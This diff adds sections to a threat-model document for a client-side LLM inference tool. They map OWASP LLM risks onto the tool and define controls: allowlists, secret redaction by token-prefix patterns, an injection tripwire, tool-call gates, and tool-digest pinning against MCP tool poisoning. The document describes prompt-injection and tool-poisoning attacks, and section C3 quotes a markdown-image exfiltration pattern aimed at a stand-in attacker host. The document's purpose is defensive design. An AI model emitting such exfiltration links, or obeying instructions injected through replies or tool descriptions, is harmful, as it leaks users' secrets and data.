@@ -191,3 +191,78 @@ Reading rule: "HF: no" means Hugging Face's routing layer; the **downstream prov
 | OpenRouter provider-policy feed (`/api/frontend/v1/all-providers`) | No license stated on the endpoint; it is an internal frontend API | Cache for internal decisions; do not redistribute; treat field names as unstable | `[FACT A that it exists and is unlicensed as of fetch, 2026-09-02]` |
 | HF Spaces code you duplicate | Whatever the Space repo declares (often none) | A Space with no LICENSE file is all-rights-reserved by default; duplicating for private use is tolerated by HF's ToS but redistributing is not clearly permitted | `[INFERENCE from copyright default; UNVERIFIED against HF ToS text]` |
 | Model outputs | Provider-specific: e.g. GLM-5.3 license disclaims warranty on "OUTPUT AND RESULTS"; Anthropic/OpenAI commercial terms assign output to the customer | Log the model id + provider per call (ledger) so provenance of generated code is recoverable | GLM LICENSE `[FACT A]`; others `[UNVERIFIED in this run]` |
+
+## 7. OWASP Top 10 for LLM Applications (2025) mapped onto the generic inference tool
+
+Source for the list: https://genai.owasp.org/llm-top-10/ `[FACT A, 2025 edition]`. The repo already vendors a long-form treatment in `.agents/skills/llm-security/AGENTS.md` `[FACT A, in-repo]`; this table is the delta that matters for a **client-side** tool that calls other people's models (most OWASP guidance assumes you host the model).
+
+| OWASP 2025 | What it means for a client-side generic inference tool | Threats above | Control (section 8) |
+|---|---|---|---|
+| **LLM01 Prompt Injection** | The model output is untrusted input to the local agent; injection arrives via the reply (T-01) and via anything the agent fetched earlier. Detection is unreliable; design so a successful injection has nowhere to go (3.6). | T-01, T-06 | C3 (output = untrusted tool result -> existing `injection_grammar` D2 tripwire), C4 (schema + allowlist + confirm gate on tool_calls) |
+| **LLM02 Sensitive Information Disclosure** | Direction reversed from the usual reading: it is the **agent** that discloses (env, `local.json`, transcripts) to a third-party model. The estate rule "never send secrets or raw private transcripts" is exactly LLM02 from the client side. | T-02, T-03, T-06, T-07, T-10 | C2 (redaction at TB1, default ON), C1 (base-URL allowlist so the bearer only ever goes to its issuer) |
+| **LLM03 Supply Chain** | Three supply chains: (a) weights (pickle vs safetensors; T-16), (b) the Space/proxy code you duplicate (T-09), (c) the MCP servers themselves - 13/42 registry entries run `npx`, 6 at `@latest` `[FACT A]`; **tool poisoning / rug pull**: hidden instructions in tool descriptions/schemas, changeable between `tools/list` calls with no integrity check in the MCP spec (Invariant Labs, 2025-04 `[FACT B, corroborated, 2025-04]` https://invariantlabs.ai/blog/mcp-security-notification ; PipeLab `[FACT C, 2025-2026]` https://pipelab.org/learn/mcp-tool-poisoning/). | T-09, T-16, T-17 | C6 (pin: hash `name+description+inputSchema` at approval, quarantine on drift; pin `npx` versions), C1 (provider allowlist) |
+| **LLM04 Data and Model Poisoning** | Mostly out of the client's hands; the client-side residue is (a) choosing providers that **train on prompts** (four flagged in OpenRouter's feed `[FACT B]`) and (b) the estate's own memory (`basic-memory` :8765) being fed model output - the in-repo B1 "poisoned memory" pre-scan already exists for that `[FACT A, injection_grammar.py docstring]`. | T-02, T-11 | C1 (`data_collection: deny`, ZDR where offered), C3 |
+| **LLM05 Improper Output Handling** | Model text pasted into shell, into files under `.agents/skills` (the SSOT), into `agents.json`. Treat as untrusted: schema-validate `tool_calls`, never `eval`, never write to SSOT paths without a diff + confirm. | T-01, A7 | C4, C5 (SSOT write gate) |
+| **LLM06 Excessive Agency** | The dedup skill's rule 3 is the LLM06 control. What it lacks: a **capability matrix** per tool (private-data / untrusted-ingest / outbound) so the host, not the prompt, can refuse the trifecta. The registry's `toolAllowlist: ["*"]` is the opposite of least privilege `[FACT A]`. | T-01, T-14, T-17 | C4 (capability tags + trifecta check in the harness), C7 (kill switch) |
+| **LLM07 System Prompt Leakage** | The persona packs (red-team / learner / coder) are sent to a stranger's Space or to a provider that retains prompts 30-55 days; a public Space's world-readable logs (T-07) leak them to anyone. Do not put anything secret in `messages[0]`; the SSOT skills are public-repo text anyway. | T-06, T-07 | C2 (redaction also scans system prompt), C1 (route sensitive personas only to `retainsPrompts=false` providers) |
+| **LLM08 Vector and Embedding Weaknesses** | `[ESTATE-LOCK]` no vector-DB memory -> largely N/A. Residue: OATS centroids (`oats.py`) are embeddings derived from **queries**; if queries include redacted-but-still-sensitive text, the centroid file is a low-grade leak sink. Low priority. | - | C2 applies before anything is persisted |
+| **LLM09 Misinformation** | Provider substitution (T-05) changes quantisation and behaviour silently; a "GLM-5.3" answer via provider X is not the same model as via provider Y. The dedup skill's `evals.md` is the right place; the ledger gives it the data. | T-05 | C8 (ledger records resolved provider + model + finish_reason) |
+| **LLM10 Unbounded Consumption** | Runaway loops on PAYG credit (HF), per-key OpenRouter limit, Cursor quota via auth2api, and RAM on a 31.6 GB box. | T-04, T-12, T-15, T-17 | C7 (budget + token caps + kill switch), native OpenRouter per-key `limit` |
+
+`[INFERENCE]` Two OWASP items dominate for this estate: LLM02 (because the agent, not the model, is the discloser) and LLM06 (because the harness holds shell and 18 credentials). LLM01 is the *mechanism*; LLM02/LLM06 are the *impact*. Controls that break the trifecta beat controls that try to recognise injection text.
+
+## 8. Minimal control set the registry and tool must enforce
+
+Design constraints carried over: `[ESTATE-LOCK]` no gateway product (LiteLLM etc.), so enforcement lives in (a) `.agents/agents.json` schema + a check script, (b) the one generic tool's process, (c) provider-native features. Fail-closed for confidentiality controls (C1, C2), fail-open for availability-shaped ones (C3 tripwire) - matching the repo's own split between `redaction.py` ("Default ON, opt-out explicit") and `injection_grammar.py` ("fail-open by contract") `[FACT A, in-repo docstrings]`.
+
+### C1 - Allowlists (registry-enforced, fail-closed)
+
+- **Base-URL allowlist.** Each inference profile declares exactly one `baseUrl` host. The tool refuses any request whose resolved host is not the profile's host, and refuses HTTP redirects across hosts (`allow_redirects=False` / follow only same-origin). This alone kills T-10 (bearer sent to a Space) and the base-URL-swap class of leaks.
+- **Credential-to-host binding.** `credentialNames[i]` is bound to an `issuer` host pattern (`hf_*` -> `*.huggingface.co`, `sk-or-v1-*` -> `openrouter.ai`). A profile that would send `HUGGINGFACE_TOKEN` to `*.hf.space` fails validation. `[INFERENCE]` from T-10.
+- **Provider allowlist per profile.** HF: pin `model:provider` and reject `provider="auto"` for profiles tagged `sensitive`; OpenRouter: set `provider.only` + `allow_fallbacks:false` + `data_collection:"deny"` in the request body **and** assign a Guardrail with the same provider allowlist to the sidecar key (belt and braces; Guardrails intersect, stricter wins `[FACT A]`).
+- **Model allowlist per profile** (registry) mirrored to the OpenRouter Guardrail model allowlist where the profile is OpenRouter.
+- **Space allowlist = empty by default.** A `*.hf.space` or Gradio base URL is permitted only for a profile explicitly tagged `stranger-space`, which forces `sensitivity: public-only` (C2 strict mode) and disables `tool_calls` execution (C4). `[RECOMMENDATION]` - this is the one place where the estate's "never remove a feature" lock bites: keep the feature, but make the tag mandatory and loud.
+- **Local runtime allowlist.** Profiles for Ollama/LM Studio/llama-server must declare `127.0.0.1`/`localhost`; the check script probes `netstat`/`Get-NetTCPConnection` for `0.0.0.0:11434`/`:1234`/`:8080` binds and fails the health check if found (T-14).
+
+### C2 - Redaction at TB1 (tool-enforced, default ON, opt-out per profile)
+
+- Reuse `tools/mcp/proxy-mcp/redaction.py`'s "name-and-length, never value" scrubber `[FACT A, in-repo]` and its rule source; extend the pattern list with OpenRouter's published Secrets preset formats (`hf_`, `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`, `github_pat_`, `sk-or-v1-`, `sk-ant-api03-`, `sk-proj-`+`T3BlbkFJ`, `dop_v1_`, `AKIA`, PEM blocks, JWTs, `xox*`) `[FACT A, 2026-09-02]` https://openrouter.ai/docs/guides/features/guardrails/secret-formats.md - every one of the estate's 18 `credentialNames` issuers that has a recognisable prefix is covered by that list.
+- Add an **exact-value** check: load the values of all 18 registry credentials from env/`local.json` at tool start and refuse to send any message containing one of them verbatim (or base64 of it). Prefix regexes miss unprefixed tokens (Codacy/Sonar/Tavily); exact-value matching does not. Never log the value; log `name+length`.
+- **Raw-transcript guard.** Refuse messages that contain more than N (say 20) lines matching the estate's transcript markers (Claude Code / Codex JSONL shapes, `agent-mail` message envelopes, `basic-memory` note frontmatter) unless the profile is tagged `transcript-ok`. This is the mechanical form of "never send raw private transcripts". `[RECOMMENDATION]`
+- Where the profile is OpenRouter, additionally assign the **Secrets** and **Sensitive Info** Guardrail presets to the sidecar key (provider-side second line; `redact` action) `[FACT A]`.
+
+### C3 - Output is an untrusted tool result (fail-open tripwire)
+
+- Route every completion through the existing D2 tripwire (`agent-self/harness/injection_grammar.py`, full grammar: directive + payload) before it is shown to the agent `[FACT A, in-repo]`; on a hit, wrap the output in an explicit `[UNTRUSTED MODEL OUTPUT - injection grammar hit: <reason_code>]` envelope rather than dropping it (feature preserved; signal added).
+- Never auto-render markdown images / links from model output in any surface that fetches them (classic `![](https://attacker/?d=...)` exfil) `[FACT B]` https://aiarch.dev/prompt-injection.
+
+### C4 - Tool-call gate at TB4 (harness-enforced)
+
+- `tool_calls` from a hosted model are validated against the **local** JSON schema and the profile's tool allowlist (the dedup skill's rule 3), then classified with three capability tags (`private-read`, `untrusted-ingest`, `outbound`). If the turn already contains `untrusted-ingest` and the call is `outbound` while `private-read` occurred, require confirm. Reuse `tools/mcp/_shared/hardening.py` `ConfirmGate` `[FACT A, in-repo]` - but note it ships **SHADOW by default**; for hosted-model-originated calls run it in `enforce`.
+- Registry: replace `toolAllowlist: ["*"]` for inference profiles with an explicit list; keep `["*"]` for the 42 MCP servers if the owner prefers (tradeoff, not removal).
+
+### C5 - SSOT write gate
+
+- Any write under `.agents/skills/**`, `.agents/agents.json`, `.agents/local.json` originating from a hosted-model tool_call requires a shown diff + confirm; `local.json` is never readable by the tool at all (it only receives resolved credential **names**). `[RECOMMENDATION]` (LLM05/LLM03 on A7).
+
+### C6 - Pin what you trust
+
+- Hash `name+description+inputSchema` of every advertised tool at approval, store in the registry entry (`toolDigest`), compare on every `tools/list`, quarantine on drift (rug-pull defence; the only control that catches it `[FACT B, corroborated]`). Pin `npx` packages to exact versions instead of `@latest` for the 6 entries (`[FACT A]`; tradeoff: manual bumps).
+- Weights: refuse non-safetensors/GGUF loads by default (T-16).
+
+### C7 - Kill switch + budgets
+
+- **Budget:** per-profile `maxTokensPerCall`, `maxCallsPerSession`, `maxUsdPerDay` (HF has no free-plan billing control `[FACT A]`, so the tool must count; OpenRouter has native per-key `limit` `[FACT A]` - set it and read `limit_remaining` at start).
+- **Kill switch:** a single file flag (e.g. `.agents/INFERENCE-HALT`) + env `INFERENCE_HALT=1` checked before every outbound call, and honoured by the tool **in-process** (no dependency on a supervisor that the OOM path might kill first - T-15). The existing `mcp-host-supervisor` AND-gate `[FACT A, in-repo]` remains the process-level layer; this is the request-level layer.
+- **Provider-side switch:** for OpenRouter, a Guardrail `limit_usd` of 0 assigned to the key is an instant, reversible, no-rotation kill `[FACT A]` - compatible with the never-rotate lock.
+
+### C8 - Ledger
+
+- One JSONL line per call in the existing event-ledger root (`events.jsonl` convention, `tools/workspace-hooks/event-ledger-extras` `[FACT A, in-repo]`): `ts, profile, baseUrl host, requested model, resolved provider (HF `x-inference-provider`-style response data / OpenRouter `openrouter_metadata` with the opt-in header `[FACT A]`), prompt sha256 (not text), redaction hits (name+length), injection-grammar hits, usage tokens, cost estimate, finish_reason, tool_calls count, confirm decisions`. This answers "where did this prompt go, what did it cost, did anything trip" without storing prompts - which would itself violate LLM02.
+
+### 8.6 Tradeoffs the owner must decide (per the locks, presented, not decided)
+
+1. **Never-rotate vs the repo's own escalation.** `.gitleaks.toml` Allowlist 1 records that `tools/mcp/workstation-codex-bundle/env/private-env.windows.json` carries real plaintext tokens intentionally committed to this private repo and "SHOULD be rotated/revoked and migrated" `[FACT A, in-repo]`. The lock says never rotate. The consistent resolution is **add-scoped-tokens-without-revoking** (S-01) plus C1/C2 so the old tokens are never sent anywhere new; the residual risk (history exposure) stays and is owned.
+2. **auth2api ToS exposure (T-18)** vs the lock to keep it until Cursor `/v1` GA: keep it, log every call in C8 so the retirement is measurable, and read Cursor's current Terms (not fetched here).
+3. **Stranger Spaces**: keep the capability (lock) behind a mandatory `stranger-space` tag that forces public-only content and no tool execution.
+4. **`npx @latest` convenience vs C6 pinning**: pinning costs manual bumps; the alternative is accepting that 6 servers run whatever ships next.
